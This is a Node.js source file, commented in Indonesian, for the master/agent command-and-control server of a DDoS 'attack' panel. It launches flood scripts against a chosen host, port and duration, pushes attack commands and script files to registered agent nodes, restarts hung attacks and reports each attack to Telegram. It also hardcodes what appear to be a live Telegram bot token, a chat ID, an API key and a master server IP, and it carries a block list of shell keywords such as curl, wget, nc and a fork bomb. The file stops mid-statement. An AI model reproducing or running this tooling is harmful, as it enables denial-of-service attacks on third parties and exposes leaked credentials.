const port = process.env.PORT || process.env.SERVER_PORT || 2090;
const TELEGRAM_BOT_TOKEN = process.env.TG_TOKEN || "7935900603:AAGA9YJcNDKfnpLYbWKwF7nSyNUBVoQb7Cw";
const TELEGRAM_CHAT_ID = process.env.TG_CHAT || "6818878581";
const NODE_TYPE = process.env.NODE_TYPE || 'agent'; // 'master' atau 'agent'
const AGENT_KEY = process.env.AGENT_KEY || "narxz";
const MASTER_URL = process.env.MASTER_URL || "http://158.69.174.202:20193"; // <--- SET URL MASTER DI SINI

const os = require('os');
const apiKey = "narxz";
const { execSync, spawn } = require('child_process');
const express = require('express');
const localtunnel = require('localtunnel');
const path = require('path');
const app = express();
const fs = require('fs');
const whois = require('whois-json');
const net = require('net');
const pidusage = require('pidusage');
const methodsPath = path.join(__dirname, 'methods.json');
const agentsPath = path.join(__dirname, 'agents.json');
const agents = require('./agents.json');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const http = require('http');
const WebSocket = require('ws');
const httpServer = http.createServer(app);
const dns = require('dns').promises;
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

app.use(express.json()); // penting untuk POST json body
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*"); // Atau batasi hanya origin master
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  next();
});

const historyPath = path.join(__dirname, 'attack_history.json');
function readHistory() {
  if (!fs.existsSync(historyPath)) return [];
  return JSON.parse(fs.readFileSync(historyPath, 'utf8'));
}
function writeHistory(history) {
  fs.writeFileSync(historyPath, JSON.stringify(history, null, 2));
}
function logAttackHistory(entry) {
  const history = readHistory();
  history.unshift(entry); // terbaru di atas
  writeHistory(history);
}
function updateAttackHistory(processId, update) {
  const history = readHistory();
  const idx = history.findIndex(h => h.processId === processId);
  if (idx !== -1) {
    Object.assign(history[idx], update);
    writeHistory(history);
  }
}
function loadAgents() {
  if (fs.existsSync(agentsPath)) {
    try {
      AGENT_LIST = JSON.parse(fs.readFileSync(agentsPath, 'utf8'));
    } catch (e) {
      console.error("Gagal baca agents.json:", e);
      AGENT_LIST = [];
    }
  } else {
    AGENT_LIST = [];
  }
}
function saveAgents() {
  fs.writeFileSync(agentsPath, JSON.stringify(AGENT_LIST, null, 2));
}

// === AGENT LIST DARI agents.json (hanya dipakai master) ===
let AGENT_LIST = [];
loadAgents();

const uploadDir = path.join(__dirname, 'lib', 'method');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const MAX_FILE_SIZE = 200 * 1024; // 200 KB
const DANGEROUS_KEYWORDS = [
  'rm ', 'rm -', 'sudo ', 'shutdown', 'reboot', ':(){:|:&};:', 'mkfs', 'dd ', 'wget ', 'curl ', 'nc ', 'netcat', 'python -m http.server', 'forkbomb', 'chmod 777 /', 'chown ', 'useradd', 'userdel', 'passwd'
];

const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, uploadDir),
  filename: (_req, file, cb) => cb(null, file.originalname)
});

const upload = multer({
  storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (_req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    const allowed = ['.js', '.sh'];
    if (!allowed.includes(ext)) {
      return cb(new Error('Hanya file .js atau .sh yang diizinkan'));
    }
    cb(null, true);
  }
});

function logActivity(action, data) {
  fs.appendFileSync(
    path.join(__dirname, 'activity.log'),
    `[${new Date().toISOString()}] ${action}: ${JSON.stringify(data)}\n`
  );
}

const DEFAULT_PHOTO_URL = 'https://ibb.co/bgKKLJDS';
function escapeTelegram(text) {
  return text.replace(/[_*[\]()`~>#\+\-=|{}.!]/g, '\\$&');
}
async function scanCommonPorts(ip, ports = [80, 443, 21, 22, 25, 53, 8080, 8443, 3306]) {
  const results = [];

  for (const port of ports) {
    const isOpen = await new Promise(resolve => {
      const socket = new net.Socket();
      socket.setTimeout(1500);
      socket.once('connect', () => {
        socket.destroy();
        resolve(true);
      });
      socket.once('timeout', () => {
        socket.destroy();
        resolve(false);
      });
      socket.once('error', () => resolve(false));
      socket.connect(port, ip);
    });
    if (isOpen) results.push({ port, status: 'open' });
  }
  return results;
}
async function sendTelegramPhoto(caption, photoUrl = DEFAULT_PHOTO_URL) {
  try {
    if (
      photoUrl &&
      (photoUrl.endsWith('.jpg') || photoUrl.endsWith('.png')) &&
      fs.existsSync(photoUrl)
    ) {
      const form = new FormData();
      form.append('chat_id', TELEGRAM_CHAT_ID);
      form.append('caption', caption);
      form.append('parse_mode', 'MarkdownV2');
      form.append('photo', fs.createReadStream(photoUrl));
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        form,
        { headers: form.getHeaders() }
      );
    } else {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          photo: photoUrl,
          caption: caption,
          parse_mode: 'MarkdownV2'
        }
      );
    }
  } catch (err) {
    // Optional: log error
  }
}

function readMethods() {
  if (!fs.existsSync(methodsPath)) return {};
  return JSON.parse(fs.readFileSync(methodsPath, 'utf8'));
}
function writeMethods(methods) {
  fs.writeFileSync(methodsPath, JSON.stringify(methods, null, 2));
}

const activeProcesses = {};
const stats = {};

const wss = new WebSocket.Server({ server: httpServer });
function broadcastWS(data) {
  const payload = typeof data === "string" ? data : JSON.stringify(data);
  wss.clients.forEach(ws => {
    if (ws.readyState === WebSocket.OPEN) ws.send(payload);
  });
}

const spawnAttackScript = (scriptName, args, processId) => {
  const isExternalPath = scriptName.includes('/') || scriptName.includes('\\');
  const scriptPath = isExternalPath
    ? path.join(__dirname, scriptName)
    : path.join(__dirname, 'lib', 'method', scriptName);
  const ls = spawn('node', [scriptPath, ...args]);

  activeProcesses[processId] = {
    ls,
    scriptName,
    args,
    status: 'running',
    lastResponse: Date.now(),
    restartCount: 0
  };

  stats[processId] = {
    rps: 0,
    pps: 0,
    bps: 0,
    _tempRps: 0,
    _tempPps: 0,
    _tempBps: 0
  };

  stats[processId]._interval = setInterval(() => {
    stats[processId].rps = stats[processId]._tempRps;
    stats[processId].pps = stats[processId]._tempPps;
    stats[processId].bps = stats[processId]._tempBps;
    stats[processId]._tempRps = 0;
    stats[processId]._tempPps = 0;
    stats[processId]._tempBps = 0;
  }, 1000);

  ls.stdout.on('data', (data) => {
    const output = data.toString();
    if (activeProcesses[processId]) {
      activeProcesses[processId].lastResponse = Date.now();
      activeProcesses[processId].status = 'running';
    }
    if (!stats[processId]) return;
    const rpsMatch = output.match(/RPS[:=]?\s*(\d+)/i);
    const ppsMatch = output.match(/PPS[:=]?\s*(\d+)/i);
    const bpsMatch = output.match(/BPS[:=]?\s*(\d+)/i);
    if (rpsMatch) stats[processId]._tempRps += parseInt(rpsMatch[1]);
    if (ppsMatch) stats[processId]._tempPps += parseInt(ppsMatch[1]);
    if (bpsMatch) stats[processId]._tempBps += parseInt(bpsMatch[1]);
    stats[processId]._tempRps += 1;
  });

  ls.stderr.on('data', (data) => {
    if (activeProcesses[processId]) {
      activeProcesses[processId].status = 'error';
    }
    logActivity("PROCESS_STDERR", { processId, error: data.toString() });
    sendTelegramPhoto(
      `❗️ *Proses error*\n` +
      `*PID:* \`${ls.pid}\`\n` +
      `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `*Error:*\n\`\`\`\n${escapeTelegram(data.toString())}\n\`\`\``
    );
  });

  ls.on('error', (err) => {
    if (activeProcesses[processId]) {
      activeProcesses[processId].status = 'crashed';
    }
    logActivity("PROCESS_CRASHED", { processId, error: err.toString() });
    sendTelegramPhoto(
      `💥 *Proses crash*\n` +
      `*PID:* \`${ls.pid}\`\n` +
      `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `*Error:*\n\`\`\`\n${escapeTelegram(err.toString())}\n\`\`\``
    );
  });

  ls.on('close', (code) => {
    if (activeProcesses[processId]) {
      activeProcesses[processId].status = 'exited';
      activeProcesses[processId].exitCode = code;
    }
    clearInterval(stats[processId]?._interval);
    delete stats[processId];
    delete activeProcesses[processId];

    // Update history
    updateAttackHistory(processId, {
      endTime: new Date().toISOString(),
      status: 'stopped',
      exitCode: code
    });
    logActivity("PROCESS_EXITED", { processId, exitCode: code });

    broadcastWS({ type: "attack_stopped", processId, exitCode: code });
    sendTelegramPhoto(
      `🛑 *Proses selesai/stop*\n` +
      `*PID:* \`${ls.pid}\`\n` +
      `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `*Exit code:* \`${code}\``
    );
  });

  return { processId, ls, scriptName, args };
};

app.use('/dashboard', express.static(path.join(__dirname, 'dashboard.html')));
app.use('/lib/method', express.static(path.join(__dirname, 'lib', 'method')));

// =================== API ENDPOINTS ===================
// ...semua endpoint API utama tetap sama...
app.get('/api/attack', async (req, res) => {
  try {
    const reqKey = req.query.key;
    const host = req.query.host;
    const targetPort = req.query.port;
    const time = parseInt(req.query.time, 10);
    const method = req.query.method;

    if (reqKey !== apiKey) return res.status(400).send('API key tidak valid');
    if (!host || !targetPort || !time || !method) return res.status(400).send('Parameter tidak lengkap');

    const methods = readMethods();
    const selected = methods[method];
    if (!selected) return res.status(400).send('Metode tidak valid');

    const args = selected.args.map(arg => {
      if (typeof arg === "string" && arg.startsWith("<") && arg.endsWith(">")) {
        switch (arg) {
          case "<host>": return host;
          case "<port>": return targetPort;
          case "<time>": return time;
          default: return arg;
        }
      }
      return arg;
    });

    const processId = `${method}-${Date.now()}`;
    const proc = spawnAttackScript(selected.script, args, processId);
    logActivity("START_ATTACK", { processId, host, targetPort, time, method, pid: proc.ls.pid, args });

    logAttackHistory({
      processId,
      startTime: new Date().toISOString(),
      endTime: null,
      host,
      port: targetPort,
      method,
      duration: time,
      status: 'running',
      who: req.query.user || 'unknown',
      masterOrAgent: NODE_TYPE
    });

    broadcastWS({ type: "attack_started", processId, host, port: targetPort, method, time });

    await sendTelegramPhoto(
      `🔥 *Serangan dimulai (${NODE_TYPE})*\n` +
      `🛡️ *Host:* \`${escapeTelegram(host)}\`\n` +
      `🎯 *Port:* \`${escapeTelegram(targetPort)}\`\n` +
      `⏱️ *Durasi:* \`${escapeTelegram(time + 's')}\`\n` +
      `⚔️ *Metode:* \`${escapeTelegram(method)}\`\n` +
      `🆔 *Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `🔢 *PID:* \`${proc.ls.pid}\``
    );

    let results = [];
    if (NODE_TYPE === 'master') {
      const activeAgents = AGENT_LIST.filter(a => a.enabled !== false);
      const promises = activeAgents.map(agent => axios.get(`${agent.url}/api/attack`, {
        params: { key: AGENT_KEY, host, port: targetPort, time, method },
        timeout: 8000
      }).then(res => ({
        agent: agent,
        status: 'success',
        data: res.data
      })).catch(err => ({
        agent: agent,
        status: 'failed',
        error: err.message || err.toString()
      }))
      );
      results = await Promise.all(promises);
      logActivity("MASTER_ATTACK", {host, targetPort, time, method, results});
      await sendTelegramPhoto(
      `🔥 *Serangan dimulai*\n` +
      `🛡️ *Host:*\`${escapeTelegram(host)}\`\n` +
      `🎯 *Port:*\`${escapeTelegram(targetPort)}\`\n` +
      `⏱️ *Durasi:*\`${escapeTelegram(time + 's')}\`\n` +
      `⚔️ *Metode:*\`${escapeTelegram(method)}\`\n` +
      `🆔 *Process ID:*\`${escapeTelegram(processId)}\`\n` +
      `🔢 *PID:*\`${proc.ls.pid}\`` +
        results.map(r => `• \`${escapeTelegram(r.agent.name || r.agent.url)}\`: *${r.status}*`).join('\n')
      );
    }

    return res.json({
      message: `Serangan dimulai (${NODE_TYPE})`,
      processId,
      pid: proc.ls.pid,
      agents: results
    });
  } catch (err) {
    logActivity("ERROR_ATTACK", { error: err.toString() });
    res.status(500).send('Kesalahan Internal Server');
  }
});

app.get('/api/activity-log', (req,res)=>{
  if(req.query.key!==apiKey) return res.status(400).send("API key tidak valid");
  const logPath = path.join(__dirname, 'activity.log');
  if(!fs.existsSync(logPath)) return res.send('');
  res.set('Content-Type','text/plain').send(fs.readFileSync(logPath,'utf8'));
});
app.delete('/api/activity-log', (req,res)=>{
  if(req.query.key!==apiKey) return res.status(400).send("API key tidak valid");
  const logPath = path.join(__dirname, 'activity.log');
  fs.writeFileSync(logPath, '');
  res.send('Log cleared');
});

app.get('/api/methods', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  res.json(readMethods());
});
app.post('/api/methods', express.json(), (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const { name, script, args } = req.body;
  if (!name || !script || !Array.isArray(args)) return res.status(400).send('Format salah');
  const methods = readMethods();
  methods[name] = { script, args };
  writeMethods(methods);
  logActivity("SAVE_METHOD", { name, script, args });
  res.json({ message: 'Method disimpan', name });
});
// PATCH: Endpoint delete method agar sync ke agent
app.delete('/api/methods/:name', async (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const methods = readMethods();
  const name = req.params.name;
  if (!methods[name]) return res.status(404).send('Method tidak ditemukan');
  const scriptFile = methods[name].script;
  delete methods[name];
  writeMethods(methods);
  logActivity("DELETE_METHOD", { name, scriptFile });

  // Hapus file terkait (jika ada)
  let fileDeleted = false;
  if (scriptFile) {
    const filePath = path.join(uploadDir, scriptFile);
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      fileDeleted = true;
      logActivity("DELETE_METHOD_FILE_AUTO", { scriptFile });
    }
  }

  // Jika master, broadcast hapus file ke agent
  let results = [];
  if (NODE_TYPE === "master" && AGENT_LIST && AGENT_LIST.length && scriptFile) {
    results = await Promise.all(AGENT_LIST.map(agent =>
      axios.post(`${agent.url}/api/methods/delete-file`, { 
        key: AGENT_KEY, 
        filename: scriptFile 
      }).then(()=>({agent,status:'success'})).catch(e=>({agent,status:'failed',error:e.message}))
    ));
    logActivity("SYNC_DELETE_METHOD_FILE", { scriptFile, results });
  }

  res.json({ message: 'Method dihapus', name, fileDeleted, sync: results });
});

// Endpoint agar agent bisa download proxy.txt dari master
app.get('/proxy.txt', (req, res) => {
  const filePath = path.join(__dirname, 'proxy.txt');
  if (!fs.existsSync(filePath)) return res.status(404).send('proxy.txt tidak ditemukan');
  res.download(filePath);
});
// === MINI FILE MANAGER ===
app.get('/api/method-files', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  fs.readdir(uploadDir, (err, files) => {
    if (err) return res.status(500).send('Gagal membaca direktori');
    const fileList = files.filter(f=>!f.startsWith('.')).map(f => {
      const stat = fs.statSync(path.join(uploadDir, f));
      return {
        name: f,
        size: stat.size,
        mtime: stat.mtime
      }
    });
    res.json(fileList);
  });
});
app.delete('/api/method-files/:filename', async (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const filename = req.params.filename;
  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  fs.unlinkSync(filePath);
  logActivity("DELETE_METHOD_FILE", { file: filename });

  // Jika master, sync hapus ke agent
  if (NODE_TYPE === "master" && AGENT_LIST && AGENT_LIST.length) {
    const results = await Promise.all(AGENT_LIST.map(agent =>
      axios.post(`${agent.url}/api/methods/delete-file`, { 
        key: AGENT_KEY, 
        filename 
      }).then(()=>({agent,status:'success'})).catch(e=>({agent,status:'failed',error:e.message}))
    ));
    logActivity("SYNC_DELETE_METHOD_FILE", { filename, results });
  }

  res.json({ message: 'File dihapus', file: filename });
});
app.get('/api/method-files/download/:filename', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const filename = req.params.filename;
  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  res.download(filePath);
});

app.post('/api/method-files/rename', express.json(), (req, res) => {
  const { oldName, newName, key } = req.body;
  if (key !== apiKey) return res.status(400).send('API key tidak valid');
  if (!oldName || !newName) return res.status(400).send('Parameter oldName dan newName diperlukan');

  const oldPath = path.join(uploadDir, oldName);
  const newPath = path.join(uploadDir, newName);

  if (!fs.existsSync(oldPath)) return res.status(404).send('File lama tidak ditemukan');
  if (fs.existsSync(newPath)) return res.status(409).send('File dengan nama baru sudah ada');

  fs.renameSync(oldPath, newPath);
  logActivity("RENAME_METHOD_FILE", { from: oldName, to: newName });

  res.json({ message: 'Nama file berhasil diubah', from: oldName, to: newName });
});

app.put('/api/methods/:oldName', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const oldName = req.params.oldName;
  const { name, script, args } = req.body;

  if (!name || !script || !Array.isArray(args)) {
    return res.status(400).send('Format salah');
  }

  const methods = readMethods();
  if (!methods[oldName]) {
    return res.status(404).send('Method lama tidak ditemukan');
  }

  // Jika nama berubah, hapus nama lama
  if (oldName !== name) {
    delete methods[oldName];
  }

  methods[name] = { script, args };
  writeMethods(methods);
  logActivity("UPDATE_METHOD", { oldName, newName: name, script, args });

  res.json({ message: 'Method diperbarui', name });
});

// === ENDPOINT AGENT: hapus file method via sinkronisasi master
app.post('/api/methods/delete-file', express.json(), (req, res) => {
  const body = req.body;
  if (body.key !== AGENT_KEY) return res.status(400).send('API key tidak valid');
  const filename = body.filename;
  if (!filename) return res.status(400).send('Parameter filename diperlukan');
  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.json({ message: 'File sudah tidak ada' });
  fs.unlinkSync(filePath);
  logActivity("AGENT_DELETE_METHOD_FILE", { file: filename });
  res.json({ message: 'File dihapus di agent', file: filename });
});

// GET file isi untuk editor
app.get('/api/method-files/view/:filename', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const filename = req.params.filename;
  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  res.type('text/plain').send(fs.readFileSync(filePath, 'utf8'));
});
// PATCH file dari editor
app.post('/api/method-files/save/:filename', express.text({ type: '*/*', limit: '5mb' }), async (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const filename = req.params.filename;
  const filePath = path.join(uploadDir, filename);
  if (!fs.existsSync(filePath)) return res.status(404).send('File tidak ditemukan');
  fs.writeFileSync(filePath, req.body, 'utf8');
  logActivity("EDIT_METHOD_FILE", { file: filename });

  // SYNC ke agent jika node master
  let syncResults = [];
  if (NODE_TYPE === "master" && AGENT_LIST && AGENT_LIST.length) {
    const FormData = require('form-data');
    const axios = require('axios');
    syncResults = await Promise.all(AGENT_LIST.map(agent => {
      const form = new FormData();
      form.append('key', AGENT_KEY);
      form.append('file', fs.createReadStream(filePath), filename);
      return axios.post(`${agent.url}/api/update`, form, { headers: form.getHeaders(), timeout: 10000 })
        .then(resp => ({ agent: agent, status: 'success', data: resp.data }))
        .catch(e => ({ agent: agent, status: 'failed', error: e.message }));
    }));
    logActivity("SYNC_EDIT_METHOD_FILE", { filename, syncResults });
  }

  res.json({ message: 'File berhasil disimpan', file: filename, sync: syncResults });
});

// ...lanjutan endpoint API lain (tidak berubah dari versi semula)...
app.post('/api/uploadmeth', upload.single('file'), async (req, res) => {
  const key = req.query.key || req.body.key;
  if (key !== apiKey) return res.status(400).send('API key tidak valid');
  if (!req.file) return res.status(400).send('Tidak ada file ter-upload');

  const filePath = path.join(uploadDir, req.file.filename);
  const fileContent = fs.readFileSync(filePath, 'utf8');

  for (const keyword of DANGEROUS_KEYWORDS) {
    if (fileContent.includes(keyword)) {
      fs.unlinkSync(filePath);
      logActivity("BLOCK_UPLOAD", { file: req.file.filename, keyword });
      await sendTelegramPhoto(
        `🚫 *Upload file diblokir*\n` +
        `*Keyword berbahaya terdeteksi:* \`${escapeTelegram(keyword)}\`\`\n` +
        `*File:* \`${escapeTelegram(req.file.filename)}\``
      );
      return res.status(400).send(`Upload diblokir: terdeteksi keyword berbahaya ("${keyword}")`);
    }
  }

  logActivity("UPLOAD_METHOD_FILE", { file: req.file.filename, size: req.file.size });
  await sendTelegramPhoto(
    `📁 *File method baru di-upload*\n` +
    `*Nama:* \`${escapeTelegram(req.file.filename)}\`\n` +
    `*Ukuran:* \`${req.file.size} bytes\``
  );

  res.json({
    message: 'File berhasil di-upload',
    fileName: req.file.filename,
    path: `lib/method/${req.file.filename}`
  });
});
// Endpoint register agent otomatis (hanya dipasang di master)
app.post('/api/agents/register', express.json(), (req, res) => {
  if (NODE_TYPE !== 'master') return res.status(403).send('Hanya master!');
  const { name, url, agentKey } = req.body;
  if (!name || !url || agentKey !== AGENT_KEY) return res.status(400).send('Parameter salah atau API key tidak valid');
  loadAgents();
  // Cek duplikat
  if (AGENT_LIST.some(a => a.url === url || a.name === name)) {
    return res.json({ message: 'Sudah terdaftar', agent: AGENT_LIST.find(a => a.url === url || a.name === name) });
  }
  const newAgent = { name, url, enabled: true, auto: true, registeredAt: new Date().toISOString() };
  AGENT_LIST.push(newAgent);
  saveAgents();
  logActivity("AGENT_REGISTER_AUTO", newAgent);
  res.json({ message: 'Agent terdaftar', agent: newAgent });
});
app.get('/api/agents', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  loadAgents();
  res.json(AGENT_LIST);
});
app.post('/api/agents', express.json(), (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const { name, url } = req.body;
  if (!name || !url) return res.status(400).send('Nama dan URL wajib diisi');
  loadAgents();
  if (AGENT_LIST.some(a => a.name === name)) return res.status(400).send('Agent dengan nama ini sudah ada');
  const newAgent = { name, url, enabled: true };
  AGENT_LIST.push(newAgent);
  saveAgents();
  logActivity("AGENT_ADDED", newAgent);
  res.json({ message: 'Agent ditambahkan', agent: newAgent });
});
app.put('/api/agents/:name', express.json(), (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const name = req.params.name;
  const { url, enabled } = req.body;
  loadAgents();
  const idx = AGENT_LIST.findIndex(a => a.name === name);
  if (idx === -1) return res.status(404).send('Agent tidak ditemukan');
  if (url !== undefined) AGENT_LIST[idx].url = url;
  if (enabled !== undefined) AGENT_LIST[idx].enabled = !!enabled;
  saveAgents();
  logActivity("AGENT_UPDATED", AGENT_LIST[idx]);
  res.json({ message: 'Agent diperbarui', agent: AGENT_LIST[idx] });
});
app.delete('/api/agents/:name', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const name = req.params.name;
  loadAgents();
  const idx = AGENT_LIST.findIndex(a => a.name === name);
  if (idx === -1) return res.status(404).send('Agent tidak ditemukan');
  const removed = AGENT_LIST.splice(idx, 1)[0];
  saveAgents();
  logActivity("AGENT_DELETED", removed);
  res.json({ message: 'Agent dihapus', agent: removed });
});
app.get('/upload', (req, res) => {
  res.send(`
    <h2>Upload File Method</h2>
    <form action="/api/uploadmeth" method="post" enctype="multipart/form-data">
      <label>API Key: <input type="text" name="key" required /></label><br/><br/>
      <label>Pilih File: <input type="file" name="file" required /></label><br/><br/>
      <button type="submit">Upload</button>
    </form>
  `);
});
app.get('/api/attack/stop', async (req, res) => {
  try {
    const reqKey = req.query.key;
    if (reqKey !== apiKey) return res.status(400).send('API key tidak valid');

    if (NODE_TYPE === 'master') {
      Object.keys(activeProcesses).forEach(pid => {
        if (activeProcesses[pid] && activeProcesses[pid].ls) {
          activeProcesses[pid].ls.kill('SIGINT');
        }
        clearInterval(stats[pid]?._interval);
        delete stats[pid];
        delete activeProcesses[pid];
        logActivity("STOP_PROCESS", { processId: pid, isMaster: true });
        broadcastWS({ type: "attack_stopped", processId: pid, exitCode: 'stopped_by_user' });
        updateAttackHistory(pid, {
          endTime: new Date().toISOString(),
          status: 'stopped',
          exitCode: 'stopped_by_user'
        });
      });

      const promises = AGENT_LIST.map(agent =>
        axios.get(`${agent.url}/api/attack/stop`, {
          params: { key: AGENT_KEY },
          timeout: 8000
        }).then(res => ({
          agent: agent,
          status: 'success',
          data: res.data
        })).catch(err => ({
          agent: agent,
          status: 'failed',
          error: err.message || err.toString()
        }))
      );
      const results = await Promise.all(promises);
      logActivity("MASTER_STOP", { results });
      await sendTelegramPhoto(
        `🛑 *STOP broadcast ke agents & master:*\n` +
        results.map(r => `• \`${escapeTelegram(r.agent.name || r.agent.url)}\`: *${r.status}*`).join('\n')
      );
      broadcastWS({ type: "all_stopped" });
      return res.json({ message: 'Semua proses di master & agents dihentikan', results });
    }

    Object.keys(activeProcesses).forEach(pid => {
      if (activeProcesses[pid] && activeProcesses[pid].ls) {
        activeProcesses[pid].ls.kill('SIGINT');
      }
      clearInterval(stats[pid]?._interval);
      delete stats[pid];
      delete activeProcesses[pid];
      logActivity("STOP_PROCESS", { processId: pid });
      broadcastWS({ type: "attack_stopped", processId: pid, exitCode: 'stopped_by_user' });
      updateAttackHistory(pid, {
        endTime: new Date().toISOString(),
        status: 'stopped',
        exitCode: 'stopped_by_user'
      });
    });

    res.send('Semua proses dihentikan.');
    await sendTelegramPhoto(`🛑 *Semua proses serangan dihentikan oleh pengguna*`);
    broadcastWS({ type: "all_stopped" });
  } catch (err) {
    logActivity("ERROR_STOP", { error: err.toString() });
    res.status(500).send('Kesalahan Internal Server');
  }
});

app.delete('/api/attack-history', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  fs.writeFileSync(historyPath, '[]', 'utf8');
  res.send('Attack history cleared.');
});

app.get('/api/attack/stop/:processId', (req, res) => {
  const key = req.query.key;
  const pid = req.params.processId;
  const validKey = (NODE_TYPE === 'master') ? apiKey : AGENT_KEY;
if (key !== validKey) return res.status(400).send('API key tidak valid');
  if (!activeProcesses[pid]) return res.status(404).send('Process ID tidak ditemukan');

  try {
    if (activeProcesses[pid].ls) {
      activeProcesses[pid].ls.kill('SIGINT');
    }
    clearInterval(stats[pid]?._interval);
    delete stats[pid];
    delete activeProcesses[pid];

    logActivity("STOP_PROCESS_MANUAL", { processId: pid });
    broadcastWS({ type: "attack_stopped", processId: pid, exitCode: 'stopped_by_user' });

    updateAttackHistory(pid, {
      endTime: new Date().toISOString(),
      status: 'stopped',
      exitCode: 'stopped_by_user'
    });

    res.json({ message: 'Proses dihentikan', processId: pid });
  } catch (e) {
    res.status(500).send('Gagal stop proses');
  }
});

app.get('/api/attack/stats', async (req, res) => {
  const reqKey = req.query.key;
  if (reqKey !== apiKey) return res.status(400).send('API key tidak valid');

  const processStats = {};
  const pidMap = {};

  for (const pid in activeProcesses) {
    const proc = activeProcesses[pid];
    processStats[pid] = {
      status: proc.status,
      lastResponse: proc.lastResponse,
      restartCount: proc.restartCount || 0,
      pid: proc.ls?.pid,
      script: proc.scriptName,
      args: proc.args,
      rps: stats[pid]?.rps || 0,
      pps: stats[pid]?.pps || 0,
      bps: stats[pid] ? Number((stats[pid].bps / 1_000_000).toFixed(2)) : 0,
      cpuPercent: null,
      memoryMB: null
    };
    if (proc.ls?.pid) {
      pidMap[pid] = proc.ls.pid;
    }
  }

  try {
    if (Object.values(pidMap).length > 0) {
      const usageResult = await pidusage(Object.values(pidMap));
      for (const [processId, pid] of Object.entries(pidMap)) {
        const usage = usageResult[pid];
        if (usage && processStats[processId]) {
          processStats[processId].cpuPercent = Number(usage.cpu.toFixed(2));
          processStats[processId].memoryMB = Math.round(usage.memory / 1024 / 1024);
        }
      }
    }
  } catch (err) {}

  const cpus = os.cpus();
  let totalIdle = 0, totalTick = 0;
  cpus.forEach(cpu => {
    for (let type in cpu.times) {
      totalTick += cpu.times[type];
    }
    totalIdle += cpu.times.idle;
  });
  const idle = totalIdle / cpus.length;
  const total = totalTick / cpus.length;
  const cpuUsage = 100 - ~~(100 * idle / total);

  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMemMB = Math.round((totalMem - freeMem) / 1024 / 1024);
  const totalMemMB = Math.round(totalMem / 1024 / 1024);

  if (NODE_TYPE === 'master') {
    const promises = AGENT_LIST.map(async (agent) => {
  const start = Date.now();
  try {
    const res = await axios.get(`${agent.url}/api/attack/stats`, {
      params: { key: AGENT_KEY },
      timeout: 8000
    });
    const ping = Date.now() - start;
    return {
      agent: agent,
      status: 'success',
      data: {
        ...res.data,
        ping // tambahkan latensi di sini
      }
    };
  } catch (err) {
    return {
      agent: agent,
      status: 'failed',
      error: err.message || err.toString()
    };
  }
});
    const agentResults = await Promise.all(promises);
    return res.json({
      master: {
        processStats,
        serverResource: {
          cpuUsagePercent: cpuUsage,
          usedMemoryMB: usedMemMB,
          totalMemoryMB: totalMemMB,
          memoryUsagePercent: Math.round(100 * usedMemMB / totalMemMB),
          uptimeSeconds: Math.floor(process.uptime())
        }
      },
      agentStats: agentResults
    });
  }

  res.json({
    processStats,
    serverResource: {
      cpuUsagePercent: cpuUsage,
      usedMemoryMB: usedMemMB,
      totalMemoryMB: totalMemMB,
      memoryUsagePercent: Math.round(100 * usedMemMB / totalMemMB),
      uptimeSeconds: Math.floor(process.uptime())
    }
  });
});

// === Restart otomatis jika hang/crash ===
setInterval(async () => {
  for (const [pid, proc] of Object.entries(activeProcesses)) {
    if (Date.now() - proc.lastResponse > 30000 && proc.status === 'running') {
      proc.ls.kill('SIGKILL');
      const { scriptName, args } = proc;
      const newProc = spawnAttackScript(scriptName, args, pid);
      activeProcesses[pid] = {
        ...newProc,
        status: 'restarted',
        lastResponse: Date.now(),
        restartCount: (proc.restartCount || 0) + 1,
        scriptName,
        args
      };
      logActivity("RESTART_HANG", { processId: pid, pid: newProc.ls.pid });
      broadcastWS({ type: "attack_restarted", processId: pid, pid: newProc.ls.pid });
      await sendTelegramPhoto(
        `♻️ *Proses hang direstart otomatis*\n` +
        `*Process ID:* \`${escapeTelegram(pid)}\`\n` +
